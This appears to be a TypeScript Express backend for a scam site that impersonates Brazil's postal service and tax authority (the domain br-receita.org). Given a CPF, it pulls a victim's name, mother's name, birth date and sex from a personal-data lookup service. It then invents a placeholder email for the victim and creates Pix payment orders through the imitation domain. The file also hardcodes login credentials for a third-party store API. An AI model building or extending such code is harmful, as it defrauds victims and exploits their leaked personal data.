import { NextFunction, Request, Response } from "express";

export const getProducts = async (req: Request, res: Response, next: NextFunction): Promise<any> => {

    try{
    
    const upstream = await fetch('https://api.ameii.com.br/api/auth/login', { method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            email: 'receita@gmail.com',
            password: 'ameiamei'
        })
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      
      const data = await upstream.json();
      let token = data.access_token
      const tenantId = '1aa1ae14-1f87-4ac4-90e6-099c8ef4468e'
      
      
      const upstream2 = await fetch('https://api.ameii.com.br/api/product', { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
          'X-Tenant': `${tenantId}`
        }
       });
      if (!upstream2.ok) {
        return res
          .status(upstream2.status)
          .json({ error: `Upstream retornou ${upstream2.status}` });
      }
     
      const data2 = await upstream2.json();
      return res.json(data2.data.filter((p: any) => p.id !== 61084 && p.id !== 61086))
    } catch (err) {
      console.log(err)
    }
};

export const paymentCorreios = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    const { phone, email,  } = req.body;
    try {
      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      const orderPayload: any = phone ?{
        payment_method: 'pix',
        customer: {
          name:    data.NOME     || 'Nome Exemplo',
          email:  email ||  `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
            .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
            .replace(/\s+/g, '')                  // tira espaços
            .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
            .toLowerCase()}@sememail.com`,
          document: cpf,
          document_type: 'CPF',
          phone_number: phone
        }
      } : {
        payment_method: 'pix',
        customer: {
          name:    data.NOME     || 'Nome Exemplo',
          email:  email ||  `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
            .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
            .replace(/\s+/g, '')                  // tira espaços
            .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
            .toLowerCase()}@sememail.com`,
          document: cpf,
          document_type: 'CPF'
        }
      };
    //   address: customization.value.disable_address ? null : {
    //     postcode: this.cep,
    //     line_one: this.number,
    //     line_two: this.street,
    //     line_three: this.complement,
    //     district: this.neighborhood,
    //     city: this.city,
    //     state: this.state,
    //     shipping_option: this.shipping_tax ? this.shipping_tax.toString() : null,

    //   },

      console.log(orderPayload)
      const orderRes = await fetch(
        `https://api-correios.br-receita.org/cart/${cartId}/order?`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify(orderPayload),
        }
      );
      if (!orderRes.ok) {
        console.log(await orderRes.json())
        return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
      }
      const orderData = await orderRes.json();
      return res.json(orderData);
    } catch (err) {
      next(err);
    }
  }



export const getCorreioCart = async(req: any, res: any, next: any) => {
    let productId = 'QU0tNjg0ZjIyYjczOWQ1MQ'
   if(req.query.productId) {
       productId = req.query.productId
   }
    try {
      const paymentRes = await fetch(
        `https://api-correios.br-receita.org/r/${productId}`,
        {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
          }
        }
      );

      if (!paymentRes.ok) {
        return res
          .status(paymentRes.status)
          .json({ error: `Payment API retornou ${paymentRes.status}` });
      }
      const cartId = (await paymentRes.text()).trim(); 
      return res.json({
        cartId
      })
    }catch(err) {
      return res.json(err)
    }
  

  }



 export const cpfConsultaCorreios = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    const { email, phone } = req.body;
    try {
      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      console.log(data)
      const getOrder = await fetch(
        `https://api-correios.br-receita.org/cart/${cartId}/customer`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify(
            phone ?
            {
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email: email ||   `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
              phone_number: phone
            }
            :
            {
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email: email ||   `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
          })
        }
      );
      if (!getOrder.ok) {
        console.log(await getOrder.json())
        return res
          .status(getOrder.status)
          .json({ error: `Payment API retornou ${getOrder.status}` });
      }
      const formattedData = {
        NOME: data.NOME,
        CPF: data.CPF,
        NOME_MAE: data.NOME_MAE,
        DT_NASCIMENTO: data.DT_NASCIMENTO,
        SEXO: data.SEXO,
      }
      return res.json(formattedData);
    } catch (err) {
      next(err);
    }


  };